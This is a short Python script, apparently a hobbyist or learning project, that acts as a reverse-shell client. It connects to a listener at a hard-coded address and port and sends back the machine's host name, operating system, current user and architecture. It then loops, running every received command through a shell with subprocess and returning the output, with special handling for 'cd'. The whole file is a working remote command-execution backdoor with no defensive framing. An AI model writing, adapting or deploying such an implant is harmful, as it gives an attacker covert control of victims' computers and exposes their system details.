import socket
import os
import subprocess
import platform
import getpass



def get_os_info():
    os = platform.platform()
    host_name = socket.gethostname() 
    host_ip = socket.gethostbyname(host_name)
    processor = platform.processor()
    current_user = getpass.getuser()
    pe_arch = platform.architecture() # WindowsPE arch
    return '%s       %s      %s                      %s' % (host_name, os, current_user, pe_arch[0]) # Learn output formatting.

s = socket.socket()
host = '127.0.0.1'
port = 9999

s.connect((host, port))

# Get information about connecting client.
s.send(bytes(get_os_info(), 'utf-8'))
response_data = s.recv(1024)

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)